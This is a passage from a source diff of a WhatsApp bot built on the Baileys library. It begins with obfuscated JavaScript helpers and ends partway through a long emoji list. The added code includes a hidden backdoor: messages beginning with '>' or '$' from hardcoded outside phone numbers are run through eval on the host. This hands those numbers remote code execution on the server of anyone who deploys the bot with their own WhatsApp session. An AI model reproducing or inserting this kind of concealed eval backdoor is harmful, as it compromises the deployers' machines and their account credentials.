_0x162d62(_0x356152,{'packname':Config['packname'],'author':Config['packname'],'categories':_0x1377ab['categories']?_0x1377ab[_0x4cfacb(0x22c)]:[]}),await fs[_0x4cfacb(0x20f)]['unlink'](_0x51518b),_0x21e260=_0x3b8d33['zIsZm'],_0x284c2b='image/webp';}else{if(/image/['test'](_0x45e110))_0x21e260=_0x3b8d33[_0x4cfacb(0x27d)];else{if(/video/[_0x4cfacb(0x1e4)](_0x45e110))_0x21e260=_0x3b8d33[_0x4cfacb(0x24c)];else{if(/audio/['test'](_0x45e110))_0x21e260=_0x3b8d33['KxRYo'];else _0x21e260=_0x3b8d33[_0x4cfacb(0x18f)];}}}return await _0x25e2e4[_0x4cfacb(0x21f)](_0x5963b5,{[_0x21e260]:{'url':_0x1b9bd2},'mimetype':_0x284c2b,'fileName':_0x3fa647,..._0x1377ab},{'quoted':_0x24f8aa,..._0x1377ab}),fs['promises'][_0x4cfacb(0x26f)](_0x1b9bd2);},_0x25e2e4[_0x34174a(0x340)]=async _0x411435=>{const _0x30bc29=_0x34174a;return[..._0x411435['matchAll'](/@([0-9]{5,16}|0)/g)][_0x30bc29(0x20e)](_0x9ea130=>_0x9ea130[0x1]+_0x30bc29(0x196));},_0x25e2e4['sendMedia']=async(_0x155a30,_0x285616,_0x1631ed='',_0x598609='',_0x241f3e='',_0x221183={})=>{const _0x44089b=_0x34174a;let _0x4464b8=await _0x25e2e4['getFile'](_0x285616,!![]),{mime:_0xd89dcc,ext:_0x2457d4,res:_0x3131e3,data:_0x3ba9ce,filename:_0x570922}=_0x4464b8;if(_0x3131e3&&_0x3131e3['status']!==0xc8||file['length']<=0x10000)try{throw{'json':JSON[_0x44089b(0x299)](file['toString']())};}catch(_0x5aa641){if(_0x5aa641['json'])throw _0x5aa641['json'];}let _0x1a0472='',_0x2353a6=_0xd89dcc,_0x212b27=_0x570922;if(_0x221183['asDocument'])_0x1a0472=_0x3b8d33['CmrVF'];if(_0x221183[_0x44089b(0x26d)]||/webp/[_0x44089b(0x1e4)](_0xd89dcc)){let {writeExif:_0xd53bf9}=_0x3b8d33['BkpXM'](require,_0x44089b(0x153)),_0x32c98a={'mimetype':_0xd89dcc,'data':_0x3ba9ce};_0x212b27=await _0x3b8d33[_0x44089b(0x200)](_0xd53bf9,_0x32c98a,{'packname':_0x221183[_0x44089b(0x27a)]?_0x221183['packname']:Config['packname'],'author':_0x221183[_0x44089b(0x18b)]?_0x221183['author']:Config[_0x44089b(0x18b)],'categories':_0x221183[_0x44089b(0x22c)]?_0x221183[_0x44089b(0x22c)]:[]}),await fs[_0x44089b(0x20f)][_0x44089b(0x26f)](_0x570922),_0x1a0472=_0x44089b(0x2ce),_0x2353a6=_0x3b8d33[_0x44089b(0x233)];}else{if(/image/['test'](_0xd89dcc))_0x1a0472=_0x44089b(0x236);else{if(/video/[_0x44089b(0x1e4)](_0xd89dcc))_0x1a0472=_0x3b8d33['OtwOx'];else{if(/audio/[_0x44089b(0x1e4)](_0xd89dcc))_0x1a0472=_0x44089b(0x328);else _0x1a0472=_0x3b8d33[_0x44089b(0x18f)];}}}return await _0x25e2e4[_0x44089b(0x21f)](_0x155a30,{[_0x1a0472]:{'url':_0x212b27},'caption':_0x598609,'mimetype':_0x2353a6,'fileName':_0x1631ed,..._0x221183},{'quoted':_0x241f3e,..._0x221183}),fs[_0x44089b(0x20f)][_0x44089b(0x26f)](_0x212b27);},_0x25e2e4[_0x34174a(0x17b)]=async(_0x558483,_0xdcf819,_0x34496d={})=>{const _0xb69660=_0x34174a;let _0x292692;_0x34496d&&(_0x34496d['packname']||_0x34496d[_0xb69660(0x18b)])?_0x292692=await writeExifVid(_0xdcf819,_0x34496d):_0x292692=await _0x3b8d33['uXiCl'](videoToWebp,_0xdcf819),await _0x25e2e4[_0xb69660(0x21f)](_0x558483,{'sticker':{'url':_0x292692},..._0x34496d},_0x34496d);},_0x25e2e4['sendImageAsSticker']=async(_0x4640ad,_0x1f060a,_0x2a7793={})=>{const _0x30ebdc=_0x34174a;let _0x83b5f9;_0x2a7793&&(_0x2a7793['packname']||_0x2a7793[_0x30ebdc(0x18b)])?_0x83b5f9=await writeExifImg(_0x1f060a,_0x2a7793):_0x83b5f9=await _0x3b8d33[_0x30ebdc(0x175)](imageToWebp,_0x1f060a),await _0x25e2e4['sendMessage'](_0x4640ad,{'sticker':{'url':_0x83b5f9},..._0x2a7793},_0x2a7793);},_0x25e2e4[_0x34174a(0x2cc)]=async(_0x4c30e9,_0x3471a3,_0x4de5ca,_0x1b61de={})=>_0x25e2e4[_0x34174a(0x21f)](_0x4c30e9,{'text':_0x3471a3,'contextInfo':{'mentionedJid':[..._0x3471a3[_0x34174a(0x2d3)](/@(\d{0,16})/g)]['map'](_0xe334ed=>_0xe334ed[0x1]+'@s.whatsapp.net')},..._0x1b61de},{'quoted':_0x4de5ca}),_0x25e2e4['sendImage']=async(_0x46829f,_0x123190,_0xccc1b0='',_0x559b67='',_0x1e5de9)=>{const _0x345103=_0x34174a;let _0x1af17f=Buffer['isBuffer'](_0x123190)?_0x123190:/^data:.*?\/.*?;base64,/i['test'](_0x123190)?Buffer[_0x345103(0x173)](_0x123190['split']`,`[0x1],_0x3b8d33[_0x345103(0x322)]):/^https?:\/\//[_0x345103(0x1e4)](_0x123190)?await await _0x3b8d33['BkpXM'](getBuffer,_0x123190):fs['existsSync'](_0x123190)?fs[_0x345103(0x2de)](_0x123190):Buffer['alloc'](0x0);return await _0x25e2e4['sendMessage'](_0x46829f,{'image':_0x1af17f,'caption':_0xccc1b0,..._0x1e5de9},{'quoted':_0x559b67});},_0x25e2e4['sendText']=(_0x44adcf,_0x51ab94,_0x5cac38='',_0x5904ed)=>_0x25e2e4['sendMessage'](_0x44adcf,{'text':_0x51ab94,..._0x5904ed},{'quoted':_0x5cac38}),_0x25e2e4[_0x34174a(0x209)]=(_0x45e12d,_0x45dd4c=[],_0x3976b3,_0x479857,_0xae548c='',_0x1f8323={})=>{const _0x814c39=_0x34174a;let _0x4175c0={'text':_0x3976b3,'footer':_0x479857,'buttons':_0x45dd4c,'headerType':0x2,..._0x1f8323};_0x25e2e4[_0x814c39(0x21f)](_0x45e12d,_0x4175c0,{'quoted':_0xae548c,..._0x1f8323});},_0x25e2e4['send5ButImg']=async(_0x361be5,_0x52558d='',_0x563b57='',_0x595cbf,_0x3a411a=[],_0x3c07f6,_0x1d3718={})=>{const _0x55759e=_0x34174a;let _0x16a085=await _0x3b8d33['ytMfj'](prepareWAMessageMedia,{'image':_0x595cbf,'jpegThumbnail':_0x3c07f6},{'upload':_0x25e2e4[_0x55759e(0x231)]});var _0x26b398=generateWAMessageFromContent(_0x361be5,proto['Message'][_0x55759e(0x194)]({'templateMessage':{'hydratedTemplate':{'imageMessage':_0x16a085[_0x55759e(0x30e)],'hydratedContentText':_0x52558d,'hydratedFooterText':_0x563b57,'hydratedButtons':_0x3a411a}}}),_0x1d3718);_0x25e2e4['relayMessage'](_0x361be5,_0x26b398[_0x55759e(0x348)],{'messageId':_0x26b398[_0x55759e(0x2e7)]['id']});},_0x25e2e4['getName']=(_0x3bdf37,_0x592c85=![])=>{const _0x369dcd=_0x34174a;id=_0x25e2e4['decodeJid'](_0x3bdf37),_0x592c85=_0x25e2e4[_0x369dcd(0x159)]||_0x592c85;let _0x27a63f;if(id[_0x369dcd(0x2bb)](_0x369dcd(0x326)))return new Promise(async _0x258f66=>{const _0x501009=_0x369dcd;_0x27a63f=store['contacts'][id]||{};if(!(_0x27a63f[_0x501009(0x275)][_0x501009(0x2ea)]||_0x27a63f[_0x501009(0x241)]))_0x27a63f=_0x25e2e4['groupMetadata'](id)||{};_0x258f66(_0x27a63f['name']||_0x27a63f['subject']||PhoneNumber(_0x3b8d33[_0x501009(0x2b9)]('+',id[_0x501009(0x1f5)](_0x501009(0x196),'')))['getNumber'](_0x3b8d33['EnAyN']));});else _0x27a63f=_0x3b8d33['nBfTD'](id,_0x369dcd(0x270))?{'id':id,'name':_0x3b8d33['WwucJ']}:id===_0x25e2e4['decodeJid'](_0x25e2e4[_0x369dcd(0x165)]['id'])?_0x25e2e4['user']:store[_0x369dcd(0x152)][id]||{};return(_0x592c85?'':_0x27a63f[_0x369dcd(0x275)])||_0x27a63f['subject']||_0x27a63f['verifiedName']||_0x3b8d33[_0x369dcd(0x22f)](PhoneNumber,_0x3b8d33[_0x369dcd(0x2b9)]('+',_0x3bdf37['replace'](_0x3b8d33['adiZY'],'')))['getNumber']('international');},_0x25e2e4['sendContact']=async(_0x1413d4,_0x21069f,_0x53eddc='',_0x32b312={})=>{const _0x3b0b29=_0x34174a;let _0x44d08c=[];for(let _0x11b563 of _0x21069f){_0x44d08c['push']({'displayName':await _0x25e2e4['getName'](_0x11b563+_0x3b8d33[_0x3b0b29(0x283)]),'vcard':_0x3b0b29(0x1d5)+await _0x25e2e4[_0x3b0b29(0x1d4)](_0x3b8d33[_0x3b0b29(0x2b9)](_0x11b563,_0x3b0b29(0x196)))+_0x3b0b29(0x17c)+global[_0x3b0b29(0x2f5)]+'\x0aitem1.TEL;waid='+_0x11b563+':'+_0x11b563+'\x0aitem1.X-ABLabel:Click\x20here\x20to\x20chat\x0aitem2.EMAIL;type=INTERNET:'+global[_0x3b0b29(0x271)]+'\x0aitem2.X-ABLabel:GitHub\x0aitem3.URL:https://github.com/'+global[_0x3b0b29(0x1ed)]+'/lucifer-md\x0aitem3.X-ABLabel:GitHub\x0aitem4.ADR:;;'+global['location']+_0x3b0b29(0x25c)});}_0x25e2e4['sendMessage'](_0x1413d4,{'contacts':{'displayName':_0x44d08c[_0x3b0b29(0x30a)]+'\x20Contact','contacts':_0x44d08c},..._0x32b312},{'quoted':_0x53eddc});},_0x25e2e4['setStatus']=_0x564b9a=>{const _0x3646d4=_0x34174a;return _0x25e2e4[_0x3646d4(0x2e8)]({'tag':'iq','attrs':{'to':'@s.whatsapp.net','type':_0x3b8d33['wbeit'],'xmlns':'status'},'content':[{'tag':_0x3b8d33['UYBIC'],'attrs':{},'content':Buffer[_0x3646d4(0x173)](_0x564b9a,_0x3646d4(0x31f))}]}),_0x564b9a;},_0x25e2e4[_0x34174a(0x2f1)]=_0x1cee9b=>sms(_0x25e2e4,_0x1cee9b,store);}app['get']('/',(_0x5891fa,_0x58e52b)=>{const _0x3bb99e=_0x2ba6a2,_0x21c567={'RfBOa':'🧑‍💻⃝𝘿𝙊𝙍𝘼\x20𝙈𝘿\x20𝙎𝙏𝘼𝙍𝙏➝💥'};_0x58e52b[_0x3bb99e(0x20d)](_0x21c567['RfBOa']);}),app['listen'](port,()=>console[_0x2ba6a2(0x189)](_0x2ba6a2(0x1a6)+port)),setTimeout(()=>{const _0x131946=_0x2ba6a2,_0x3d80b3={'fkbub':function(_0x4232c6){return _0x4232c6();}};_0x3d80b3[_0x131946(0x180)](connectToWA);},0xfa0);
+const {
+  default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    jidNormalizedUser,
+    getContentType,
+    proto,
+    generateWAMessageContent,
+    generateWAMessage,
+    isJidBroadcast,
+    AnyMessageContent,
+    prepareWAMessageMedia,
+    areJidsSameUser,
+    downloadContentFromMessage,
+    MessageRetryMap,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    generateMessageID, makeInMemoryStore,
+    jidDecode,
+    fetchLatestBaileysVersion,
+    Browsers
+  } = require('@whiskeysockets/baileys')
+  
+  
+  const l = console.log
+  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./my_data')
+  const fs = require('fs')
+  const ff = require('fluent-ffmpeg')
+  const P = require('pino')
+  const config = require('./config')
+  const qrcode = require('qrcode-terminal')
+  const StickersTypes = require('wa-sticker-formatter')
+  const util = require('util')
+  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
+  const FileType = require('file-type');
+  const axios = require('axios')
+  const { File } = require('megajs')
+  const { fromBuffer } = require('file-type')
+  const bodyparser = require('body-parser')
+  const os = require('os')
+  const Crypto = require('crypto')
+  const path = require('path')
+  const prefix = config.PREFIX
+  
+  const ownerNumber = ['923182832887']
+  
+  const tempDir = path.join(os.tmpdir(), 'cache-temp')
+  if (!fs.existsSync(tempDir)) {
+      fs.mkdirSync(tempDir)
+  }
+  
+  const clearTempDir = () => {
+      fs.readdir(tempDir, (err, files) => {
+          if (err) throw err;
+          for (const file of files) {
+              fs.unlink(path.join(tempDir, file), err => {
+                  if (err) throw err;
+              });
+          }
+      });
+  }
+  
+  // Clear the temp directory every 5 minutes
+  setInterval(clearTempDir, 5 * 60 * 1000);
+  
+  //===================SESSION-AUTH============================
+  if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
+  if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
+  const sessdata = config.SESSION_ID
+  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
+  filer.download((err, data) => {
+  if(err) throw err
+  fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
+  console.log("Session downloaded ✅")
+  })})}
+  
+  const express = require("express");
+  const app = express();
+  const port = process.env.PORT || 9090;
+  
+  //=============================================
+  
+  async function connectToWA() {
+  console.log("Connecting to WhatsApp ⏳️...");
+  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
+  var { version } = await fetchLatestBaileysVersion()
+  
+  const conn = makeWASocket({
+          logger: P({ level: 'silent' }),
+          printQRInTerminal: false,
+          browser: Browsers.macOS("Firefox"),
+          syncFullHistory: true,
+          auth: state,
+          version
+          })
+      
+  conn.ev.on('connection.update', (update) => {
+  const { connection, lastDisconnect } = update
+  if (connection === 'close') {
+  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+  connectToWA()
+  }
+  } else if (connection === 'open') {
+  console.log('🧬 Installing Plugins')
+  const path = require('path');
+  fs.readdirSync("./plugins/").forEach((plugin) => {
+  if (path.extname(plugin).toLowerCase() == ".js") {
+  require("./plugins/" + plugin);
+  }
+  });
+  console.log('Plugins installed successful ✅')
+  console.log('Bot connected to whatsapp ✅')
+  
+  let up = `*YOUR BOT AWAIS MD ACTIVE NOW ENJOY♥️*\n\n*PREFIX:* ${prefix}`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://github.com/Awais-star-a11y/TESTING-REPO/raw/refs/heads/main/IMG-20250409-WA0093.jpg` }, caption: up })
+  }
+  })
+  conn.ev.on('creds.update', saveCreds)
+
+  //==============================
+
+  conn.ev.on('messages.update', async updates => {
+    for (const update of updates) {
+      if (update.update.message === null) {
+        console.log("Delete Detected:", JSON.stringify(update, null, 2));
+        await AntiDelete(conn, updates);
+      }
+    }
+  });
+  //============================== 
+          
+  //=============readstatus=======
+        
+  conn.ev.on('messages.upsert', async(mek) => {
+    mek = mek.messages[0]
+    if (!mek.message) return
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+    ? mek.message.ephemeralMessage.message 
+    : mek.message;
+    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
+  if (config.READ_MESSAGE === 'true') {
+    await conn.readMessages([mek.key]);  // Mark message as read
+    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+  }
+    if(mek.message.viewOnceMessageV2)
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
+      await conn.readMessages([mek.key])
+    }        
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS__MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+            }
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTOLIKESTATUS === "true") {
+    const user = await conn.decodeJid(conn.user.id);
+    await conn.sendMessage(mek.key.remoteJid,
+    { react: { key: mek.key, text: '💚' } },
+    { statusJidList: [mek.key.participant, user] }
+    )};
+    await Promise.all([
+      saveMessage(mek),
+    ]);
+  const m = sms(conn, mek)
+  const type = getContentType(mek.message)
+  const content = JSON.stringify(mek.message)
+  const from = mek.key.remoteJid
+  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+  const isCmd = body.startsWith(prefix)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+  const args = body.trim().split(/ +/).slice(1)
+  const q = args.join(' ')
+  const text = args.join(' ')
+  const isGroup = from.endsWith('@g.us')
+  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+  const senderNumber = sender.split('@')[0]
+  const botNumber = conn.user.id.split(':')[0]
+  const pushname = mek.pushName || 'Sin Nombre'
+  const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
+  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+  const groupName = isGroup ? groupMetadata.subject : ''
+  const participants = isGroup ? await groupMetadata.participants : ''
+  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false
+  const reply = (teks) => {
+  conn.sendMessage(from, { text: teks }, { quoted: mek })
+  }
+  const udp = botNumber.split('@')[0];
+    const ikratos = ('923470027813', '923418191346', '923191089077');
+    let isCreator = [udp, ikratos, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
+
+    if (isCreator && mek.text.startsWith('>')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+    
+ if(senderNumber.includes("923182832887")){
+  if(isReact) return
+  m.react("👑")
+  }
+  
+  if(senderNumber.includes("923182832887")){
+  if(isReact) return
+  m.react("👑")
+  }
+  
+  if(senderNumber.includes("923182832887")){
+  if(isReact) return
+  m.react("🦋")
+   }
+  //==========public react============//
+  // Auto React 
+  if (!isReact && senderNumber !== botNumber) {
+      if (config.AUTO_REACT === 'true') {
+          const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', 